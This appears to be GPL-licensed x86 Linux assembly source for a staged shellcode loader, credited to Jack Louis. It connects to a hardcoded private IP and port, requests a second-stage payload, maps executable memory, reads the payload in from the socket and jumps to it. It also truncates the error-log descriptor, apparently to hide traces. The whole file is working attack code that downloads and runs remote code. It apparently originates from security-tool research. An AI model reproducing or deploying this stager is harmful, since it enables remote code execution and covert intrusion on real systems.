/**********************************************************************
 * Copyright (C) 2005-2006 (Jack Louis) <jack@rapturesecurity.org>    *
 *                                                                    *
 * This program is free software; you can redistribute it and/or      *
 * modify it under the terms of the GNU General Public License        *
 * as published by the Free Software Foundation; either               *
 * version 2 of the License, or (at your option) any later            *
 * version.                                                           *
 *                                                                    *
 * This program is distributed in the hope that it will be useful,    *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of     *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the      *
 * GNU General Public License for more details.                       *
 *                                                                    *
 * You should have received a copy of the GNU General Public License  *
 * along with this program; if not, write to the Free Software        *
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.          *
 **********************************************************************/
#define SYS_exit	$0x01
#define SYS_read	$0x03
#define SYS_write	$0x04
#define SYS_open	$0x05
#define SYS_close	$0x06
#define SYS_socket	$0x61
#define SYS_connect	$0x62
#define SYS_mmap	$0x47
#define SYS_ftruncate	$0xc9

#define S_connect	$0x03

#define O_RDONLY	$0x02

#define PROT_RWX	$0x07
#define MAP_PRIVATE	$0x02
#define MAP_ANONYMOUS	$0x20
#define MAP_FIXED	$0x10

#define TIMEOUT		$0x10

#define SOCKET_FD	-60(%ebp)
#define MEMORY_PTR	-64(%ebp)
#define ZERO_FD		-68(%ebp)
#define STAGE2_SIZE	-72(%ebp)
#define TMPPTR		-76(%ebp)

#define SYSCALL		int	$0x80
#define DEBUG_TRAP	int	$0x03

#define STAGE2_EP_1	$0x41313131
#define STAGE2_EP_2	$0x61313131

#define ZEROREG		%edi

# _exit
.macro exit0
	xorl    %eax,   %eax
	pushl   %eax
	incl    %eax
	pushl   %eax
	SYSCALL
.endm

.macro ask_stage2
	# -20 platform (1 = linux x86)
	movl	SOCKET_FD,	%ebx
	xorl	%ecx,		%ecx
	incl	%ecx
	movl	%ecx,		-20(%ebp)
	leal	-20(%ebp),	%ecx
	xorl	%edx,		%edx
	addb	$0x04,		%dl
	xorl	%eax,		%eax
	movb	SYS_write,	%al
	SYSCALL
.endm

.macro socket_make
	# int socket(int domain, int type, int protocol);
	xorl	%eax,		%eax
	movb	SYS_socketcall,	%al		# SYS_socketcall
	xorl	%ebx,		%ebx
	incl	%ebx
	incl	%ebx
	movl	%ebx,		-28(%ebp)	# PF_INET
	decl	%ebx
	movl	%ebx,		-24(%ebp)	# SOCK_STREAM
	decl	%ebx
	movl	%ebx,		-20(%ebp)	# IPPROTO_IP
	leal	-28(%ebp),	%ecx
	incl	%ebx			# socket
	SYSCALL
	# XXX Error Checking
	movl	%eax,		SOCKET_FD
.endm

.macro connect	sock	addr	port
	# int connect(int sockfd, const struct sockaddr *serv_addr, socklen_t addrlen);
	# -44 sockaddr_in
	# -40 sockaddr_in
	# -36 sockaddr_in
	# -32 sockaddr_in
	# -28 param 1
	# -24 param 2
	# -20 param 3
	xorl	%eax,			%eax
	movb	$0x02,			%al
	movw	%ax,			-44(%ebp)	# 2 = PF_INET
	movw	\port,			-42(%ebp)	# Port
	movl	\addr,			-40(%ebp)	# Addr 
	#
	movl	\sock,			-28(%ebp)	# socket
	leal	-44(%ebp),		%eax		#
	movl	%eax,			-24(%ebp)	#
	movl	ZEROREG,		-20(%ebp)	#
	addb	$0x10,			-20(%ebp)	# 16 = sizeof(sockaddr)
	xorl	%ebx,			%ebx
	movb	S_connect,		%bl		# connect
	leal	-28(%ebp),		%ecx		# put args in place
	xorl	%eax,			%eax
	movb	SYS_socketcall,		%al
	SYSCALL
.endm

.macro debug_setup
	call get_eip
get_eip:
	popl	%ecx
	xorl	%eax,		%eax
	movb	SYS_signal,	%al	#
	xorl	%ebx,		%ebx
	movb	$0xc,		%bl	# SIGUSR2
	addb	$0x14,		%bl
	SYSCALL
	xorl	%eax,		%eax
	movb	SYS_pause,	%al	#
	SYSCALL
.endm
	
.macro truncate_errorlog fd
	xorl	%eax,		%eax
	movb	SYS_ftruncate,	%al
	xorl	%ebx,		%ebx
	incl	%ebx
	incl	%ebx
	xor	%ecx,		%ecx
	SYSCALL
.endm

.macro prolog
	movl	%esp,		%ebp
	subl	$127,		%esp
	xorl	ZEROREG,	ZEROREG
.endm

.macro read_stage2_size
	xorl	%eax,		%eax
	movb	SYS_read,	%al
	movl	SOCKET_FD,	%ebx
	pushl	%eax
	movl	%esp,		%ecx
	xorl	%edx,		%edx
	addb	$4,		%dl
	SYSCALL
	popl	%eax
	movl	%eax,		STAGE2_SIZE	# stash for later
.endm

.macro allocate_memory size
	# open(/dev/zero, O_RDONLY)
	# - 4 FD from opencall
	# - 8 \0\0\06f [o\0\0\0]
	# -12 71657a2f [/zer]
	# -16 7665642f [/dev]

	movl	\size,		-24(%ebp)

	#xorl	%eax,		%eax
	#movb	$0x6f,		%al
	#movl	%eax,		-8(%ebp)
	#movl	$0x72657a2f,	-12(%ebp)
	#movl	$0x7665642f,	-16(%ebp)
	#leal	-16(%ebp),	%ebx
	#xorl	%ecx,		%ecx
	#movb	O_RDONLY,	%cl
	#movb	SYS_open,	%al
	#SYSCALL
	#movl	%eax,	-4(%ebp)

	# so we want old_mmap(0, 4096, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, FD, 0) (syscall 90)
	# -28	START	0
	# -24	SIZE	(SET UP ALREADY ABOVE)
	# -20	PROT	7	= PROT_WRITE|PROT_READ|PROT_EXEC
	# -16	FLAGS	2	= MAP_PRIVATE
	# -12	FD	?	= FD (not used)
	# - 8 	OFF	0
	movl	STAGE2_EP_1,	%eax
	xorl	STAGE2_EP_2,	%eax
	movl	%eax,		-28(%ebp)
	xorl	%eax,		%eax
	movl	%eax,		-8(%ebp)
	xorl	%eax,		%eax
	movb	$0x07,		%al
	movl	%eax,		-20(%ebp)
	movb	MAP_PRIVATE,	%al
	xorb	MAP_ANONYMOUS,	%al
	xorb	MAP_FIXED,	%al
	movl	%eax,		-16(%ebp)
	#movl	-4(%ebp),	%eax
	movl	%eax,		-12(%ebp)
	xorl	%eax,		%eax
	leal	-28(%ebp),	%ebx
	movb	$0x5a,		%al
	SYSCALL
	movl	%eax,	MEMORY_PTR
.endm

.macro readin_stage2 size
	movl	MEMORY_PTR,	%edi
	movl	%edi,		TMPPTR
	movl	STAGE2_SIZE,	%esi
again:
	movl	SOCKET_FD,	%ebx
	movl	TMPPTR,		%ecx
	movl	STAGE2_SIZE,	%edx
	xorl	%eax,		%eax
	movb	SYS_read,	%al
	SYSCALL
	xorl	%ebx,		%ebx
	cmp	%eax,		%ebx
	jg error
	cmp	%eax,		STAGE2_SIZE
	je out
	subl	%eax,		STAGE2_SIZE
	addl	%eax,		TMPPTR
	jmp	again
error:
	xorl	%eax,		%eax
	incl	%eax
	int	$0x80
out:
.endm

.macro execute_stage2
	jmp	*MEMORY_PTR
.endm

.globl _start

_start:
	#debug_setup
	#no_virtual_bullshit
	int 	$3
	prolog
	truncate_errorlog
	socket_make
	movl	SOCKET_FD,	%esi
	movl	$0x0137a8c0,	%edx
	connect	%esi	%edx	$0x9326
	ask_stage2
	read_stage2_size
	# returns %eax as size from stage2 server AND stashes it at STAGE2_SIZE
	allocate_memory %eax
	readin_stage2
	#ouch
	execute_stage2
